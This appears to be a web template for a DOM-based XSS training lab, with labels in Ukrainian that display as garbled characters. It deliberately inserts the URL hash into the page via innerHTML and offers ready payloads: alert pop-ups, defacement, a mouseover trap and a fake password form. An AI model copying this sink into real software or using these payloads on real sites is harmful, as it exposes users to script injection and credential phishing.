{% extends 'base.html' %}

{% block content %}
<div style="max-width: 1000px; margin: 0 auto;">
    
    <div style="text-align: center; margin-bottom: 30px;">
        <h1 style="color: #e67e22; margin-bottom: 10px;">‚ö° DOM-Based XSS Lab</h1>
        <p style="color: #7f8c8d;">–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞. –î–∞–Ω—ñ –∑ URL –ø–æ—Ç—Ä–∞–ø–ª—è—é—Ç—å –ø—Ä—è–º–æ –≤ –∫–æ–¥ —Å—Ç–æ—Ä—ñ–Ω–∫–∏.</p>
    </div>

    <div class="box" style="border-top: 4px solid #e67e22;">
        <h3 style="color: #e67e22; margin-top:0;">üõë –í—Ä–∞–∑–ª–∏–≤–∞ –∑–æ–Ω–∞ (Sink)</h3>
        <p style="font-size:13px; color: #666;">
            –°–∫—Ä–∏–ø—Ç –∑—á–∏—Ç—É—î <b>window.location.hash</b> (–≤—Å–µ –ø—ñ—Å–ª—è #) —ñ –≤—Å—Ç–∞–≤–ª—è—î —Ü–µ –≤ –±–ª–æ–∫ –Ω–∏–∂—á–µ —á–µ—Ä–µ–∑ <b>innerHTML</b>.
        </p>
        
        <div id="welcome-msg" style="padding: 20px; background: #fdf2e9; border: 2px dashed #e67e22; border-radius: 5px; text-align: center; font-size: 18px; min-height: 50px;">
            –û—á—ñ–∫—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö –∑ URL...
        </div>

        <div style="margin-top: 30px;">
            <h4 style="border-bottom: 1px solid #eee; padding-bottom: 10px;">üî• –ì–æ—Ç–æ–≤—ñ —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∞—Ç–∞–∫:</h4>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
                <button onclick="attack('#<img src=x onerror=alert(\'XSS_SUCCESS\')>')" class="btn btn-orange">1. Image Error (Alert)</button>
                <button onclick="attack('#<body onload=alert(\'ONLOAD_XSS\')>')" class="btn btn-orange">2. Body OnLoad</button>
                
                <button onclick="attack('#<h1 style=\'color:red; font-size:40px\'>–¢–ï–ü–ï–† –¶–ï –ú–Ü–ô –°–ê–ô–¢</h1>')" class="btn btn-red">3. Defacement (–ó–º—ñ–Ω–∞ –≤–∏–≥–ª—è–¥—É)</button>
                <button onclick="attack('#<button onmouseover=alert(\'Gotcha!\') style=\'padding:20px; font-size:20px; background:black; color:white\'>–ù–ê–í–ï–î–ò –ù–ê –ú–ï–ù–ï</button>')" class="btn btn-purple">4. –ö–Ω–æ–ø–∫–∞-–ø–∞—Å—Ç–∫–∞ (Mouseover)</button>
            </div>
            
            <button onclick="attack('#<div style=\'background:white; padding:20px; border:1px solid #ccc\'><h3 style=\'margin-top:0\'>Session Expired</h3><input placeholder=\'Password\' type=\'password\' style=\'width:100%; padding:10px;\'><br><br><button class=\'btn btn-blue btn-full\'>Login</button></div>')" class="btn btn-blue btn-full" style="margin-top: 15px;">5. –§–µ–π–∫–æ–≤–∞ —Ñ–æ—Ä–º–∞ (Phishing)</button>
        </div>
    </div>

    <div class="box" style="border-top: 4px solid #7f8c8d; background: #f9f9f9;">
        <h3 style="color: #7f8c8d; margin-top:0;">üíª –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ JS</h3>
        <pre class="code-preview" style="background: #2c3e50; height: auto;">
// –û—Ç—Ä–∏–º—É—î–º–æ —Ö–µ—à –∑ URL (—Å–∏–º–≤–æ–ª–∏ –ø—ñ—Å–ª—è #)
var hash = decodeURIComponent(window.location.hash.substring(1));

// üíÄ –ù–ï–ë–ï–ó–ü–ï–ß–ù–û: –í—Å—Ç–∞–≤–∫–∞ HTML –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏
if(hash) {
    document.getElementById("welcome-msg").innerHTML = "–ü—Ä–∏–≤—ñ—Ç, " + hash;
}</pre>
    </div>

</div>

<script>
    // –í–†–ê–ó–õ–ò–í–ê –õ–û–ì–Ü–ö–ê
    var hash = decodeURIComponent(window.location.hash.substring(1));
    if(hash) {
        document.getElementById("welcome-msg").innerHTML = "–ü—Ä–∏–≤—ñ—Ç, " + hash;
    }

    // –î–æ–ø–æ–º—ñ–∂–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è –¥–ª—è –∫–Ω–æ–ø–æ–∫
    function attack(payload) {
        window.location.hash = payload;
        window.location.reload();
    }
</script>
{% endblock %}